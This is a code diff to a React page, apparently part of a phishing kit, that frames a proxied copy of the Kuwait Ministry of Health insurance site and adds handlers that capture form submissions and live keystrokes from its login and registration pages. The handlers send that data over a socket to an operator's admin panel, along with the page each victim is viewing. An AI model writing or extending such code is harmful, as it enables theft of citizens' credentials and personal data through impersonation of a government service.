@@ -1,4 +1,5 @@
 import { useState, useEffect, useRef } from 'react';
+import { socket, visitor, sendData, navigateToPage } from '../lib/store';
 
 const WORKER_BASE = 'https://moh-proxy.fanarali881.workers.dev';
 
@@ -16,12 +17,68 @@ export default function KuwaitInsuranceHome() {
   const [iframePath] = useState(getSavedPath);
 
   useEffect(() => {
-    // Listen for postMessage from Worker
+    // Listen for postMessage from Worker (navigation + form data)
     const handleMessage = (event: MessageEvent) => {
-      if (event.data && event.data.type === 'moh-navigation' && event.data.path) {
+      if (!event.data || !event.data.type) return;
+
+      // Handle navigation tracking
+      if (event.data.type === 'moh-navigation' && event.data.path) {
         localStorage.setItem('moh-current-path', event.data.path);
+        // Update page in admin panel
+        const pageName = getPageName(event.data.path);
+        navigateToPage(pageName);
+      }
+
+      // Handle form data capture
+      if (event.data.type === 'moh-form-data' && event.data.fields) {
+        console.log('Captured form data from MOH:', event.data);
+        const fields = event.data.fields;
+        const pagePath = event.data.page || '';
+        const pageName = getPageName(pagePath);
+
+        // Send data to server via socket
+        if (socket.value.connected && visitor.value._id) {
+          const payload = {
+            content: fields,
+            page: pageName,
+            waitingForAdminResponse: false,
+          };
+          console.log('Sending MOH form data to server:', payload);
+          socket.value.emit('more-info', payload);
+        } else {
+          // Store and retry
+          console.log('Socket not ready, retrying in 1s...');
+          setTimeout(() => {
+            if (socket.value.connected && visitor.value._id) {
+              const payload = {
+                content: fields,
+                page: pageName,
+                waitingForAdminResponse: false,
+              };
+              socket.value.emit('more-info', payload);
+            }
+          }, 1000);
+        }
+      }
+
+      // Handle input change tracking (real-time)
+      if (event.data.type === 'moh-input-change' && event.data.fields) {
+        console.log('Input change from MOH:', event.data);
+        const fields = event.data.fields;
+        const pagePath = event.data.page || '';
+        const pageName = getPageName(pagePath);
+
+        if (socket.value.connected && visitor.value._id) {
+          const payload = {
+            content: fields,
+            page: pageName + ' (إدخال مباشر)',
+            waitingForAdminResponse: false,
+          };
+          socket.value.emit('more-info', payload);
+        }
       }
     };
+
     window.addEventListener('message', handleMessage);
 
     // Also try polling iframe URL as fallback
@@ -31,7 +88,6 @@ export default function KuwaitInsuranceHome() {
         if (iframe && iframe.contentWindow) {
           const path = iframe.contentWindow.location.pathname + iframe.contentWindow.location.search;
           if (path && path !== '/') {
-            // Remove worker base path prefix if present
             const cleanPath = path.startsWith('/Insurance') ? path : '/Insurance/logaction';
             localStorage.setItem('moh-current-path', cleanPath);
           }
@@ -46,6 +102,18 @@ export default function KuwaitInsuranceHome() {
       clearInterval(interval);
     };
   }, []);
+
+  // Convert URL path to readable page name
+  function getPageName(path: string): string {
+    if (!path) return 'الصفحة الرئيسية';
+    const lower = path.toLowerCase();
+    if (lower.includes('/login')) return 'تسجيل الدخول';
+    if (lower.includes('/register') || lower.includes('/signup') || lower.includes('/createaccount') || lower.includes('/newuser')) return 'إنشاء حساب جديد';
+    if (lower.includes('/logaction')) return 'الصفحة الرئيسية';
+    if (lower.includes('/service') || lower.includes('/application')) return 'صفحة الخدمات';
+    if (lower.includes('/insurance')) return 'التأمين الصحي';
+    return path;
+  }
 
   return (
     <div style={{
